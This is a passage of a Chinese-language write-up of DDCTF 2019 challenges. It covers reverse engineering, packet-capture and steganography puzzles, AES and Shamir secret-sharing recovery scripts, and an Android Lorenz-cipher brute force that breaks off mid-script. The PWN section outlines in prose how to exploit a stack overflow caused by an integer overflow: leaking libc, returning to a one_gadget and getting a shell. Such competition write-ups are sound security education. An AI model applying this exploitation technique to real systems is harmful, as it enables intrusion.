<p><code>DDCTF{hello******TheFlag}</code><br>(PS:&#x9898;&#x76EE;&#x4F5C;&#x8005;&#x771F;&#x662F;&#x4E00;&#x540D;&#x4F18;&#x79C0;&#x7684;&#x7A0B;&#x5E8F;&#x5458;&lt;&#x6ED1;&#x7A3D;&gt;)</p>
<h3 id="reverse-2"><a name="reverse-2" class="anchor-navigation-ex-anchor" href="#reverse-2"><i class="fa fa-link" aria-hidden="true"></i></a>2.1.2. Reverse 2</h3>
<p>&#x4F5C;&#x8005;&#xFF1A;<strong>impakho</strong><br>&#x67E5;&#x58F3;&#xFF0C;&#x663E;&#x793A; ASPack &#xFF0C;&#x7528;&#x5DE5;&#x5177;&#x8131;&#x58F3;&#x3002;&#x4E0A; IDA &#x5206;&#x6790;&#x3002;<br><img src="https://impakho.com/images/6368c5b9e8780b87fffb0d505ff89a82.png" alt=""><br>sub_11D11F0 &#x51FD;&#x6570;&#x5224;&#x65AD;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x5728; 0-9,A-F &#x7684;&#x8303;&#x56F4;&#x5185;&#xFF0C;&#x5E76;&#x4E14;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;&#x5076;&#x6570;&#x3002;<br><img src="https://impakho.com/images/221384786587208c4feccd99dbc6be07.png" alt=""><br>sub_11D1240 &#x51FD;&#x6570;&#x662F;&#x4E00;&#x4E2A; hex2bin &#x7684;&#x8F6C;&#x6362;&#x3002;<br><img src="https://impakho.com/images/907ab35fe1058a7624eff9e49bc6380e.png" alt=""><br>sub_11D1000 &#x51FD;&#x6570;&#x662F;&#x4E00;&#x4E2A; base64 &#x7F16;&#x7801;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x7F16;&#x7801;&#x7ED3;&#x679C;&#x518D;&#x5F02;&#x6216; 0x76&#x3002;<br>&#x7F16;&#x7801;&#x8868;&#x4E3A; byte_11D3020&#x3002;<br><img src="https://impakho.com/images/604efddc509e81b70aabbdfc24b9070a.png" alt="">  </p>
<p>&#x8D34;&#x4E0A;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#xFF1A;</p>
<pre class="language-"><code>enc=&apos;reverse+&apos;
dec1=&apos;&apos;
table=&apos;373435323330313E3F3C3D3A3B383926272425222320212E2F2C171415121310111E1F1C1D1A1B181906070405020300010E0F0C46474445424340414E4F5D59&apos;.decode(&apos;hex&apos;)
dec2=[]
flag=&apos;&apos;

for i in enc:
    dec1+=chr(ord(i)^0x76)
for i in dec1:
    dec2.append(table.index(i))
for i in range(2):
    a=dec2[4*i+0]
    b=dec2[4*i+1]
    c=dec2[4*i+2]
    d=dec2[4*i+3]
    flag+=chr((a&lt;&lt;2)|(b&gt;&gt;4))
    flag+=chr(((b&lt;&lt;4)&amp;0xff)|(c&gt;&gt;2))
    flag+=chr(((c&lt;&lt;6)&amp;0xff)|d)
flag=flag.encode(&apos;hex&apos;).upper()
print &apos;DDCTF{%s}&apos; % flag
</code></pre><p>Flag: <code>DDCTF{AD******C7BE}</code></p>
<h2 id="misc"><a name="misc" class="anchor-navigation-ex-anchor" href="#misc"><i class="fa fa-link" aria-hidden="true"></i></a>2.2. MISC</h2>
<p>&#x4F5C;&#x8005;&#xFF1A;<strong>admin-&#x7434;&#x91CC;&#x3001;impakho</strong>  </p>
<h3 id="wireshark"><a name="wireshark" class="anchor-navigation-ex-anchor" href="#wireshark"><i class="fa fa-link" aria-hidden="true"></i></a>2.2.1. wireshark</h3>
<p>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x6D41;&#x91CF;&#x5305;&#xFF0C;&#x5206;&#x6790;&#x6D41;&#x91CF;&#x5305;&#x5E76;&#x672A;&#x53D1;&#x73B0;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x3002; &#x3002;&#x3002;<br>&#x7136;&#x540E;&#xFF0C;&#x5C31;&#x8BD5;&#x7740;&#x5BFC;&#x51FA;&#x6587;&#x4EF6; &#x5F97;&#x5230;&#xFF1A;<br><img src="https://i.loli.net/2019/04/19/5cb918c6110fe.png" alt=""><br>&#x5E76;&#x672A;&#x6709;&#x4EFB;&#x4F55;&#x53D1;&#x73B0;&#x3002;&#x3002; &#x7136;&#x540E;&#xFF0C;&#x5C31;&#x8BD5;&#x7740;&#x518D;&#x6B21;&#x5206;&#x6790;&#x6D41;&#x6D6A;&#x5305;&#x3002; &#x5728;&#x8FFD;&#x8E2A;&#x6D41;&#x65F6;&#x53D1;&#x73B0;&#x591A;&#x4E2A;&#x56FE;&#x7247;&#x3002;<br><img src="https://i.loli.net/2019/04/19/5cb918c673d0b.png" alt=""><br><img src="https://i.loli.net/2019/04/19/5cb918c67370d.png" alt=""><br><img src="https://i.loli.net/2019/04/19/5cb918c6818fc.png" alt=""><br>&#x53C8;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x7F51;&#x7AD9;&#x3002;&#x3002;&#x3002;<br><img src="https://i.loli.net/2019/04/19/5cb918c664be1.png" alt=""><br>&#x628A;&#x56FE;&#x7247;&#x624B;&#x52A8;&#x5BFC;&#x51FA;&#x3002;&#x3002;&#x3002; &#xFF08;16&#x8FDB;&#x5236;&#x5DE5;&#x5177;&#xFF09; &#x5F97;&#x5230;&#xFF1A;<br><img src="https://i.loli.net/2019/04/19/5cb918c66ab77.png" alt=""><br>&#x53D1;&#x73B0;&#x4E86;&#x94A5;&#x5319;&#x3002;&#x3002;&#x3002;<br>&#x7136;&#x540E;&#x5C31;&#x662F;&#x83B7;&#x5F97;key<br>&#x53D1;&#x73B0;&#x56FE;&#x7247;&#x94A5;&#x5319;&#x5934;&#x671D;&#x4E0B;&#x3002;&#x3002;&#x3002;<br>&#x731C;&#x6D4B;&#x53EF;&#x80FD;&#x9690;&#x85CF;&#x9AD8;&#x5EA6;&#xFF1A;<br>&#x628A;&#x9AD8;&#x5EA6;&#x6539;&#x4E3A;07 50&#xFF0C;&#x5F97;&#x5230;key<br><img src="https://i.loli.net/2019/04/19/5cb918c66b135.png" alt=""><br>key:57pmYyWt<br>&#x7136;&#x540E;&#x5728;&#x7EBF;&#x89E3;&#x5BC6;&#x5C31;&#x5F97;&#x5230;flag&#x4E86;&#x3002;</p>
<h3 id="multzor"><a name="multzor" class="anchor-navigation-ex-anchor" href="#multzor"><i class="fa fa-link" aria-hidden="true"></i></a>2.2.2. MulTzor</h3>
<p>&#x6D41;&#x91CF;&#x5206;&#x6790;&#x3002;&#x5173;&#x952E;&#x70B9;&#x5728; HTTP &#x91CC;&#x3002;<br><img src="https://impakho.com/images/33fbed3cd9e8e89435ed3a9071261e01.png" alt=""><br>&#x8FD9;&#x91CC;&#x4E0A;&#x4F20;&#x4E86;&#x4E24;&#x5F20;&#x56FE;&#x7247;&#xFF0C;&#x53EF;&#x4EE5;&#x5BFC;&#x51FA;&#x6765;&#x5F97;&#x5230; upload.png &#x548C; interesting.png&#x3002;<br>upload.png &#x5728; MacOS &#x548C; Kali &#x4E0B;&#x90FD;&#x65E0;&#x6CD5;&#x9884;&#x89C8;&#xFF0C;&#x60F3;&#x5230;&#x5E94;&#x8BE5;&#x662F;&#x56FE;&#x7247;&#x5C3A;&#x5BF8;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x6839;&#x636E; PNG &#x5934;&#x90E8;&#x7684; CRC &#x7206;&#x7834;&#x56FE;&#x7247;&#x5C3A;&#x5BF8;&#xFF0C;&#x56FE;&#x7247;&#x5C3A;&#x5BF8;&#x4FEE;&#x590D;&#x811A;&#x672C;&#x5982;&#x4E0B;&#x3002;  </p>
<pre class="language-"><code>import os
import binascii
import struct

misc = open(&quot;upload.png&quot;,&quot;rb&quot;).read()

for i in range(1024):
    data = misc[12:20] + struct.pack(&apos;&gt;i&apos;,i) + misc[24:29]
    crc32 = binascii.crc32(data) &amp; 0xffffffff
    if crc32 == struct.unpack(&apos;&gt;i&apos;,misc[29:33])[0]:
        print i
        data = misc[0:20] + struct.pack(&apos;&gt;i&apos;,i) + misc[24:]
        open(&apos;upload_repaire.png&apos;,&apos;wb&apos;).write(data)
</code></pre><p><img src="https://impakho.com/images/10853287b0aa535f3098488867f43033.png" alt="">
&#x770B;&#x5230;&#x6709;&#x4E2A; Key: <code>xS8niJM7</code> &#xFF0C;&#x7ED3;&#x5408;&#x6D41;&#x91CF;&#x5305;&#x91CC;&#x8BBF;&#x95EE;&#x8FC7;&#x7684; <a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank">&#x5728;&#x7EBF;&#x56FE;&#x7247;&#x9690;&#x5199;&#x7F51;&#x5740;</a> &#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x7EBF;&#x89E3;&#x5BC6;&#x51FA; interesting.png &#x91CC;&#x9690;&#x5199;&#x7684;&#x5185;&#x5BB9;&#x3002;<br><img src="https://impakho.com/images/d2e21ba3a1fa3b09c9836c194352c8c6.png" alt=""><br>Flag: <code>DDCTF{NbuiBUlR5l*****fpEmueZd64OlRJ1D2}</code></p>
<h3 id="&#x5317;&#x4EAC;&#x5730;&#x94C1;"><a name="&#x5317;&#x4EAC;&#x5730;&#x94C1;" class="anchor-navigation-ex-anchor" href="#&#x5317;&#x4EAC;&#x5730;&#x94C1;"><i class="fa fa-link" aria-hidden="true"></i></a>2.2.3. &#x5317;&#x4EAC;&#x5730;&#x94C1;</h3>
<blockquote>
<p>&#x63D0;&#x793A;&#xFF1A;AES ECB&#x5BC6;&#x94A5;&#x4E3A;&#x5C0F;&#x5199;&#x5B57;&#x6BCD;
&#x63D0;&#x793A;2&#xFF1A;&#x5BC6;&#x94A5;&#x4E0D;&#x8DB3;&#x4F4D;&#x7528;\0&#x8865;&#x5168;
&#x63D0;&#x793A;3&#xFF1A;&#x4E0D;&#x8981;&#x5149;&#x8BB0;&#x5F97;&#x9690;&#x5199;&#x4E0D;&#x770B;&#x56FE;&#x7247;&#x672C;&#x8EAB;&#x554A;...</p>
</blockquote>
<p><img src="https://impakho.com/images/49be6616ba0a32684d6dc71b1a20bec8.png" alt=""><br>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF0C;&#x67E5;&#x9690;&#x5199;&#xFF0C;&#x5728; LSB &#x91CC;&#x627E;&#x5230;&#x4E00;&#x4E32; base64 &#x7F16;&#x7801;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5E94;&#x8BE5;&#x662F; AES &#x7684;&#x5BC6;&#x6587;&#x3002;<br><img src="https://impakho.com/images/f0622488ab8ec745dc68568fe54c0905.png" alt=""><br>&#x8FDB;&#x4E00;&#x6B65;&#x6839;&#x636E; Color Threshold &#x63D0;&#x793A;&#xFF0C;&#x7528; PhotoShop &#x8C03;&#x6574;&#x56FE;&#x7247;&#x7684;&#x9600;&#x503C;&#xFF0C;&#x627E;&#x5230; &#x5317;&#x4EAC;&#x5730;&#x94C1;&#x7EBF;&#x8DEF;&#x56FE; &#x4E0A;&#x67D0;&#x4E00;&#x7AD9;&#x70B9;&#x7684;&#x989C;&#x8272;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x4E2A;&#x7AD9;&#x70B9;&#x7684; &#x5C0F;&#x5199;&#x62FC;&#x97F3;&#x5B57;&#x6BCD; &#x4E3A;&#x52A0;&#x5BC6;&#x5BC6;&#x94A5;&#x3002;<br><img src="https://impakho.com/images/39a3fb90b4177c0095d3c0c283a26916.png" alt="">  </p>
<pre class="language-"><code>from Crypto.Cipher import AES
from base64 import *

cipher=b64decode(&apos;7SsQWmZ524i/yVWoMeAIJA==&apos;)
key=&apos;weigongcun&apos;.ljust(16,&apos;\x00&apos;)
mode=AES.MODE_ECB

c=AES.new(key, mode)
print c.decrypt(cipher)
</code></pre><p>Flag: <code>DDCTF{Q****@B0}</code></p>
<h3 id="&#x8054;&#x76DF;&#x51B3;&#x7B56;&#x5927;&#x4F1A;"><a name="&#x8054;&#x76DF;&#x51B3;&#x7B56;&#x5927;&#x4F1A;" class="anchor-navigation-ex-anchor" href="#&#x8054;&#x76DF;&#x51B3;&#x7B56;&#x5927;&#x4F1A;"><i class="fa fa-link" aria-hidden="true"></i></a>2.2.4. &#x8054;&#x76DF;&#x51B3;&#x7B56;&#x5927;&#x4F1A;</h3>
<p>&#x4EE5;&#x4E0B;&#x4E3A;&#x4F7F;&#x7528;&#x5230;&#x7684;7&#x4E2A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x5E38;&#x6570;&#xFF1A;</p>
<pre class="language-"><code>p =
C45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627
E3ED40FBDE968251984513ACC2B627B4A483A6533
&#x7EC4;&#x7EC7;1&#x6210;&#x5458;1 =
729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB17
77357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E
&#x7EC4;&#x7EC7;1&#x6210;&#x5458;2 =
478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C
24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6
&#x7EC4;&#x7EC7;1&#x6210;&#x5458;4 =
BFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB
5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D
&#x7EC4;&#x7EC7;2&#x6210;&#x5458;3 =
9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A
0A494BE36CEF44ADE376317E7A0C70633E3091A61
&#x7EC4;&#x7EC7;2&#x6210;&#x5458;4 =
79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393F
C7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8
&#x7EC4;&#x7EC7;2&#x6210;&#x5458;5 =
2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472
444A3CE2368E5A6EBF96603B3CD10EAE858150510
</code></pre><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF0C;&#x5728;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x4E0A;&#x53EF;&#x4EE5;&#x627E;&#x5230; <a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing" target="_blank">Shamir&#x7B97;&#x6CD5;</a> &#x7684;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#x3002;<br>&#x4F7F;&#x7528; &#x7EC4;&#x7EC7;1&#x6210;&#x5458;1 &amp; &#x7EC4;&#x7EC7;1&#x6210;&#x5458;2 &amp; &#x7EC4;&#x7EC7;1&#x6210;&#x5458;4 &amp; p&#xFF0C;&#x53EF;&#x4EE5;&#x89E3;&#x5BC6;&#x5F97;&#x5230; &#x7EC4;&#x7EC7;1&#x5BC6;&#x6587;&#x3002;<br>&#x4F7F;&#x7528; &#x7EC4;&#x7EC7;2&#x6210;&#x5458;3 &amp; &#x7EC4;&#x7EC7;2&#x6210;&#x5458;4 &amp; &#x7EC4;&#x7EC7;2&#x6210;&#x5458;5 &amp; p&#xFF0C;&#x53EF;&#x4EE5;&#x89E3;&#x5BC6;&#x5F97;&#x5230; &#x7EC4;&#x7EC7;2&#x5BC6;&#x6587;&#x3002;<br>&#x521A;&#x5F00;&#x59CB;&#x60F3;&#x76F4;&#x63A5;&#x5C06;&#x4E24;&#x8005;&#x8FDB;&#x884C; xor &#x5904;&#x7406;&#xFF0C;&#x5E94;&#x8BE5;&#x5C31;&#x80FD;&#x5F97;&#x5230;&#x660E;&#x6587;&#xFF0C;&#x5176;&#x5B9E;&#x8FD9;&#x6837;&#x884C;&#x4E0D;&#x901A;&#x3002;<br>&#x540E;&#x6765;&#x53D1;&#x73B0;&#x5C06;&#x4E24;&#x8005;&#x62FF;&#x53BB;&#x8FDB;&#x884C;&#x89E3;&#x5BC6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x660E;&#x6587;&#x4E86;&#x3002;<br>&#x9644;&#x4E0A;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#xFF1A;</p>
<pre class="language-"><code>from __future__ import division
from __future__ import print_function

import random
import functools

_PRIME = 2**127 - 1

_RINT = functools.partial(random.SystemRandom().randint, 0)

def _eval_at(poly, x, prime):
    accum = 0
    for coeff in reversed(poly):
        accum *= x
        accum += coeff
        accum %= prime
    return accum

def make_random_shares(minimum, shares, prime=_PRIME):
    if minimum &gt; shares:
        raise ValueError(&quot;pool secret would be irrecoverable&quot;)
    poly = [_RINT(prime) for i in range(minimum)]
    points = [(i, _eval_at(poly, i, prime))
              for i in range(1, shares + 1)]
    return poly[0], points

def _extended_gcd(a, b):
    x = 0
    last_x = 1
    y = 1
    last_y = 0
    while b != 0:
        quot = a // b
        a, b = b, a%b
        x, last_x = last_x - quot * x, x
        y, last_y = last_y - quot * y, y
    return last_x, last_y

def _divmod(num, den, p):
    inv, _ = _extended_gcd(den, p)
    return num * inv

def _lagrange_interpolate(x, x_s, y_s, p):
    k = len(x_s)
    assert k == len(set(x_s)), &quot;points must be distinct&quot;
    def PI(vals):
        accum = 1
        for v in vals:
            accum *= v
        return accum
    nums = []
    dens = []
    for i in range(k):
        others = list(x_s)
        cur = others.pop(i)
        nums.append(PI(x - o for o in others))
        dens.append(PI(cur - o for o in others))
    den = PI(dens)
    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)
               for i in range(k)])
    return (_divmod(num, den, p) + p) % p

def recover_secret(shares, prime=_PRIME):
    if len(shares) &lt; 2:
        raise ValueError(&quot;need at least two shares&quot;)
    x_s, y_s = zip(*shares)
    print (x_s)
    return _lagrange_interpolate(0, x_s, y_s, prime)

def main():
    p=0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533
    a1=(1,0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E)
    a2=(2,0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6)
    a4=(4,0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D)
    b3=(3,0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61)
    b4=(4,0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8)
    b5=(5,0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510)
    shares=[a1,a2,a4,b3,b4,b5]
    r1=recover_secret(shares[:3],p)
    r2=recover_secret(shares[-3:],p)
    print(hex(r1))
    print(hex(r2))
    r3=r1^r2
    print(hex(r3))
    c1=(1,r1)
    c2=(2,r2)
    shares=[c1,c2]
    r4=recover_secret(shares,p)
    print(hex(r4))
    print(hex(r4)[2:-1].decode(&apos;hex&apos;))

if __name__ == &apos;__main__&apos;:
    main()
</code></pre><p>Flag: <code>DDCTF{vF22holF5hl5*****FZ5kZ1DBdWOGObk}</code></p>
<h2 id="pwn"><a name="pwn" class="anchor-navigation-ex-anchor" href="#pwn"><i class="fa fa-link" aria-hidden="true"></i></a>2.3. PWN</h2>
<p>&#x4F5C;&#x8005;&#xFF1A;<strong>admin-&#x7434;&#x91CC;</strong></p>
<h3 id="strike"><a name="strike" class="anchor-navigation-ex-anchor" href="#strike"><i class="fa fa-link" aria-hidden="true"></i></a>2.3.1. Strike</h3>
<p><img src="https://i.loli.net/2019/04/19/5cb91b427896f.png" alt=""><br>&#x9996;&#x5148;&#xFF0C;&#x6211;&#x4EEC;&#x8BFB;&#x4E00;&#x4E0B;&#x6574;&#x4E2A;&#x7A0B;&#x5E8F;<br><img src="https://i.loli.net/2019/04/19/5cb91b42e7842.jpg" alt=""><br>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x91CC;buf&#x53EF;&#x4EE5;&#x8F93;&#x5165;0x40&#x4E2A;&#x5B57;&#x8282;<br><img src="https://i.loli.net/2019/04/19/5cb91b42c2206.jpg" alt=""><br>&#x67E5;&#x770B;&#x5B89;&#x5168;&#x68C0;&#x67E5;&#xFF0C;&#x6CA1;&#x6709;canary<br>&#x540E;&#x9762;&#x901A;&#x8FC7;&#x8C03;&#x8BD5;&#x8FD9;&#x91CC;&#x8F93;&#x5165;&#x53EF;&#x4EE5;&#x6CC4;&#x9732;<br><img src="https://i.loli.net/2019/04/19/5cb91b42b7893.jpg" alt=""><br><img src="https://i.loli.net/2019/04/19/5cb91b42c777c.jpg" alt=""><br>&#x4E0B;&#x9762;&#x8F93;&#x5165;password<br>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x91CC;signed &#x53D8;&#x6210;&#x4E86;unsigned<br>&#x8FD9;&#x91CC;&#x7684;&#x8BDD; &#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6574;&#x5F62;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;<br><img src="https://i.loli.net/2019/04/19/5cb91b42bcde3.jpg" alt=""><br><img src="https://i.loli.net/2019/04/19/5cb91b42bb492.jpg" alt=""><br>&#x7136;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6808;&#x6EA2;&#x51FA;&#x653B;&#x51FB;<br>&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x7B2C;&#x4E00;&#x6B65;&#x6CC4;&#x9732;libc&#x5730;&#x5740;<br>&#x5728;&#x8FDB;&#x884C;&#x7B2C;&#x4E8C;&#x90E8;&#x653B;&#x51FB;&#x7684;&#x65F6;&#x5019;<br><img src="https://i.loli.net/2019/04/19/5cb91b42d3a7a.jpg" alt=""><br>&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x6700;&#x540E;&#x7684;&#x6307;&#x4EE4;&#x662F;&#x4F1A;&#x56F0;&#x4F4F;&#x4F60;&#x7684;<br>lea esp,[ecx-4]<br>&#x6539;&#x53D8;&#x4E86;&#x6808;&#x5730;&#x5740;<br>retn&#x7684;&#x65F6;&#x5019;&#x8981;&#x6CE8;&#x610F;<br>&#x6211;&#x5C1D;&#x8BD5;&#x6309;&#x7167;&#x4E00;&#x822C;&#x7684;&#x505A;&#x6CD5;&#x76F4;&#x63A5;&#x8986;&#x76D6;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;<br>&#x5C31;&#x53EA;&#x80FD;&#x6CC4;&#x9732;&#x6808;&#x5730;&#x5740;<br>&#x7136;&#x540E;&#x8BA1;&#x7B97;&#x504F;&#x79FB;<br>&#x7B97;&#x51FA;libc_base<br>&#x9644;&#x4EF6;&#x7ED9;&#x4E86;libc&#xFF0C;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;onegadget<br>&#x7136;&#x540E;&#x901A;&#x8FC7;&#x7B2C;&#x4E8C;&#x90E8;&#x7684;&#x6808;&#x6EA2;&#x51FA;<br>&#x6784;&#x9020;&#x8FD4;&#x56DE;&#x4E3A;one_gadget<br>&#x5C31;&#x76F4;&#x63A5;shel<br><img src="https://i.loli.net/2019/04/19/5cb91b42f02be.jpg" alt=""><br>&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x62FF;&#x5230;flag  </p>
<h2 id="android"><a name="android" class="anchor-navigation-ex-anchor" href="#android"><i class="fa fa-link" aria-hidden="true"></i></a>2.4. Android</h2>
<p><strong>&#x611F;&#x8C22;&#x4F5C;&#x8005;&#xFF1A;impakho</strong></p>
<h3 id="breaking-lem"><a name="breaking-lem" class="anchor-navigation-ex-anchor" href="#breaking-lem"><i class="fa fa-link" aria-hidden="true"></i></a>2.4.1. Breaking LEM</h3>
<blockquote>
<p>&#x63D0;&#x793A;&#xFF1A;The format of the flag is DDCTF{ddctf-android-lorenz-ZFXXXXXX}, where XXXXXX represents a 6-char string comprised of A-Z and 0-9. MAX Attempts Limit is 5</p>
</blockquote>
<p>&#x770B;&#x9898;&#x76EE;&#x5E94;&#x8BE5;&#x662F; <code>Lorenz Cipher</code>&#xFF0C;&#x4E0A;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x6076;&#x8865;&#x4E00;&#x756A;&#x3002;<br>&#x53CD;&#x7F16;&#x8BD1; APK&#xFF0C;&#x627E;&#x5230;&#x5173;&#x952E;&#x51FD;&#x6570;&#x5728; <code>libhello-libs.so</code> &#x6587;&#x4EF6;&#x91CC;&#x7684;&#xFF1A;  </p>
<pre class="language-"><code>Java_com_didictf_guesskey2019lorenz_MainActivity_stringFromJNI(int a1);
</code></pre><p>&#x7ED3;&#x5408;&#x52A8;&#x6001;&#x8C03;&#x8BD5;&#xFF0C;&#x5206;&#x6790;&#x51FA;&#x8F93;&#x5165;&#x8981;&#x4EE5; <code>ddctf-android-lorenz-</code> &#x5F00;&#x5934;&#xFF0C;&#x91CC;&#x9762;&#x4F1A;&#x53BB;&#x9664;&#x8FD9;&#x4E2A;&#x5F00;&#x5934;&#xFF0C;&#x7136;&#x540E;&#x5224;&#x65AD;&#x5269;&#x4E0B;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x5728; A-Z,1-6 &#x8303;&#x56F4;&#x5185;&#xFF0C;&#x7136;&#x540E;&#x62FF;&#x53BB;&#x505A; <code>Lorenz Encrypt</code>&#xFF0C;&#x6700;&#x540E;&#x52A0;&#x5BC6;&#x7ED3;&#x679C;&#x505A; 5&#x8F6E;sha256 &#x8BA1;&#x7B97;&#xFF0C;&#x6BD4;&#x8F83;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x4E0E;&#x8BBE;&#x5B9A;&#x503C;&#x76F8;&#x540C;&#x3002;<br>LEM &#x521D;&#x59CB;&#x5316;&#x65F6;&#x4F1A;&#x8BBE;&#x7F6E; <code>Pinsettings</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8F6E;&#x5B50;&#x7684;&#x521D;&#x59CB;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x6B21;&#x8F6C;&#x8F6E;&#x751F;&#x6210;&#x56FA;&#x5B9A;&#x7684;&#x5BC6;&#x94A5;&#xFF0C;&#x6709;&#x70B9;&#x50CF; <code>srand</code> &#x548C; <code>rand</code> &#x4EA7;&#x751F;&#x4F2A;&#x968F;&#x673A;&#x6570;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x7136;&#x540E;&#x7528;&#x6237;&#x8F93;&#x5165;&#x8FD8;&#x7ECF;&#x8FC7; <code>TelePrinter</code> &#x7684; <code>Baudot</code> &#x7F16;&#x7801;&#x8F6C;&#x6362;&#x3002;&#x751F;&#x6210;&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x7528;&#x6237;&#x8F93;&#x5165;&#x8FDB;&#x884C; xor &#x5904;&#x7406;&#x3002;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x52A0;&#x5BC6;&#x9700;&#x8981;&#x8FDB;&#x884C; 10&#x8F6E; &#x8FD9;&#x4E2A;&#x6B65;&#x9AA4;&#x3002;<br>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF0C;&#x9700;&#x8981;&#x4EA4;&#x7ED9; LEM &#x505A;&#x52A0;&#x5BC6;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E3A; ZFXXXXXX&#xFF08;X &#x4EE3;&#x8868;&#x7684;&#x5B57;&#x7B26;&#x5728; A-Z,1-6 &#x8303;&#x56F4;&#x5185;&#xFF09;&#x3002;<br><img src="https://impakho.com/images/bf6f246c1f64526199ef711cbf883972.png" alt=""><br>&#x4E3A;&#x4E86;&#x7701;&#x4E8B;&#xFF0C;&#x5728;&#x6B64;&#x5904;&#x4E0B;&#x65AD;&#x70B9;&#x8BFB; v4&#xFF0C;&#x8BFB; 8*10=80 &#x6B21;&#xFF0C;&#x628A;&#x9700;&#x8981;&#x7528;&#x5230;&#x7684;&#x5BC6;&#x94A5;&#x8BFB;&#x51FA;&#x6765;&#x3002;<br>&#x5DF2;&#x77E5;&#x660E;&#x6587;&#x524D;&#x9762;&#x4E24;&#x5B57;&#x8282;&#x4E3A; ZF&#xFF0C;&#x9700;&#x8981;&#x7206;&#x7834;&#x540E;&#x9762;6&#x5B57;&#x8282;&#x3002;<br>&#x5199;&#x51FA;&#x7206;&#x7834;&#x811A;&#x672C;&#x5982;&#x4E0B;&#xFF1A;  </p>
<pre class="language-"><code>from hashlib import sha256

target=&apos;4b27bd0beaa967e3625ff6f8b8ecf76c5beaa3bda284ba91967a3a5e387b0fa7&apos;
table=&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ123456&apos;

